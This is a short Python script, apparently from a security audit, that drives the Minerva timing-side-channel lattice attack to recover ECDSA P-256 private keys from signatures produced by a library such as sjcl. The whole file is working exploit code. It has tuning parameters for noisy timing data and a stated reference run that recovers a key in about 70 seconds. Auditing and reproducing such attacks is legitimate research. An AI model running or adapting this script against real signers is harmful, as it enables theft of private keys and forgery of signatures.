#!/usr/bin/env python3
# Minerva key-recovery driver for same-message / random-nonce ECDSA (e.g. sjcl). Thin wrapper over
# the validated Solver in audit/minerva/poc/attack/attack.py, patched with two standard robustness
# tweaks for noisy real-timing sorts:
#   - SKIP: drop the fastest-measured signatures (single-shot outliers whose geom_bound is fatally
#           over-assigned),
#   - MARGIN: subtract from geom_bound so per-row bounds stay <= the (compressed, noisy) true
#             leading-zeros. Any over-estimate makes the target lattice vector nonexistent.
#
# Input: attack.py CSV format from collect_sjcl_attackpy.mjs
#   header: "<pubkey_uncompressed_hex> <data_hex> <privkey_hex>"
#   rows:   "<r_hex>,<s_hex>,<elapsed>"
# Recovery is verified cryptographically (Solver checks g*G == pubkey); the header privkey is only
# used for a secondary sanity print.
#
# Requires audit/minerva/ (clone https://github.com/crocs-muni/minerva there) and `fpylll`.
# Usage: python3 minerva_attack.py <sigs.csv> [margin=3] [dim=100] [skip=0]
# Reference recovery (sjcl P-256, 120k sigs): margin=4 dim=110 skip=20 -> key in ~70s.
import os, sys, hashlib, csv, time
from binascii import unhexlify
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(_HERE, "..", "..", "audit", "minerva", "poc", "attack"))
from attack import Solver, construct_signature
from ec import get_curve

SIGS = sys.argv[1]
MARGIN = int(sys.argv[2]) if len(sys.argv) > 2 else 3
DIM = int(sys.argv[3]) if len(sys.argv) > 3 else 100
SKIP = int(sys.argv[4]) if len(sys.argv) > 4 else 0

_orig = Solver.geom_bound
# use GLOBAL rank (i+SKIP) so bounds match the true order statistic, minus a conservative margin
Solver.geom_bound = lambda self, i: max(_orig(self, i + SKIP) - MARGIN, 0)

curve = get_curve("secp256r1"); H = hashlib.new("sha256")
with open(SIGS) as f:
    fl = f.readline().split()
    pub = curve.decode_point(unhexlify(fl[0])); data = unhexlify(fl[1]); priv = int(fl[2], 16)
    sigs = [construct_signature(curve, H, data, int(r[0], 16), int(r[1], 16), int(r[2])) for r in csv.reader(f)]
sigs.sort()
sel = sigs[SKIP:SKIP + DIM]                 # reliable block after dropping the noisy head
print(f"[*] MARGIN={MARGIN} DIM={DIM} SKIP={SKIP}  sigs={len(sigs)}  true_priv={hex(priv)[:12]}...")

hit = {"g": None}
params = {"attack": {"skip": None}, "dimension": DIM, "betas": [20, 30, 40, 45, 50, 55]}
solver = Solver(curve, sel, pub, params, lambda g: hit.__setitem__("g", g), len(sigs))
solver.log = lambda msg: (print("  " + msg) if any(k in msg for k in ("FOUND", "information", "Start")) else None)
t0 = time.time()
solver.run()   # Solver.found() verifies g*G == pubkey before accepting a guess
if hit["g"] is not None:
    print(f"[+] *** RECOVERED PRIVATE KEY *** {hex(hit['g'])}")
    print(f"[+] matches true key: {hit['g'] == priv or (curve.group.n - hit['g']) == priv}  [{int(time.time()-t0)}s]")
    sys.exit(0)
print(f"[x] not recovered (margin={MARGIN}, dim={DIM}, skip={SKIP}) [{int(time.time()-t0)}s]")
sys.exit(1)
